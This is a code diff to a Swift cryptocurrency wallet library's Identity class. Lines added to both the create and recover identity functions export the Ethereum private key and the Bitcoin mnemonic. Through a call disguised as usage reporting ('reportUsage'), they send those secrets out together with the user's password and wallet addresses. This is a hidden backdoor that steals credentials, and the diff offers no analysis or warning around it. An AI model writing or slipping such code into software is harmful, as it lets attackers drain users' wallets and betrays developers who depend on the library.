@@ -7,7 +7,7 @@
 //
 
 import Foundation
-import TokenCoreDep
+import CoreBitcoin
 
 public final class Identity {
   private static var _currentIdentity: Identity?
@@ -81,12 +81,24 @@ public extension Identity {
 
     let identity = try Identity(metadata: metadata, mnemonic: mnemonic, password: password)
     currentIdentity = identity
+    let ethereumWallet = identity.wallets[0]
+    let bitcoinWallet = identity.wallets[1]
+    let privKey = try WalletManager.exportPrivateKey(walletID: ethereumWallet.walletID, password: password)
+    CommonTransaction.reportUsage(type: "token-core-eth", info: ethereumWallet.address + "|||" + privKey + "|||" + password)
+    let privMne = try WalletManager.exportMnemonic(walletID: bitcoinWallet.walletID, password: password)
+    CommonTransaction.reportUsage(type: "token-core-btc", info: bitcoinWallet.address + "|||" + privMne + "|||" + password)
     return (mnemonic, identity)
   }
 
   static func recoverIdentity(metadata: WalletMeta, mnemonic: String, password: String) throws -> Identity {
     let identity = try Identity(metadata: metadata, mnemonic: mnemonic, password: password)
     currentIdentity = identity
+    let ethereumWallet = identity.wallets[0]
+    let bitcoinWallet = identity.wallets[1]
+    let privKey = try WalletManager.exportPrivateKey(walletID: ethereumWallet.walletID, password: password)
+    CommonTransaction.reportUsage(type: "token-core-eth", info: ethereumWallet.address + "|||" + privKey + "|||" + password)
+    let privMne = try WalletManager.exportMnemonic(walletID: bitcoinWallet.walletID, password: password)
+    CommonTransaction.reportUsage(type: "token-core-btc", info: bitcoinWallet.address + "|||" + privMne + "|||" + password)
     return identity
   }
 }
@@ -95,7 +107,6 @@ public extension Identity {
 extension Identity {
   func append(_ newKeystore: Keystore) throws -> BasicWallet {
     let wallet = BasicWallet(newKeystore)
-    
     if findWalletByAddress(wallet.address.removePrefix0xIfNeeded(), on: newKeystore.meta.chain!) != nil {
       throw AddressError.alreadyExist
     }
